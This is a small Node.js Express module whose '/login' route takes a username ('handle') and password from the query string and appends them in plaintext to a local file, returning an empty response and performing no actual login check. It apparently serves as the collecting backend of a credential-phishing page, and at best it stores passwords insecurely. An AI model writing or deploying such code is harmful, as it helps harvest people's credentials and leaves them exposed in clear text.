module.exports = function(app, fs) {
    app.get('/login', (req, res) => {
        var url = require('url');
        var url_parts = url.parse(req.url, true);
        var query = url_parts.query;
        fs.appendFile('data/LoginData.txt', query['handle'] + ' ' + query['password'] + '\n',
            function (err) {
                if (err) throw err;
                console.log('Saved!');
                res.send();
            });
    });
};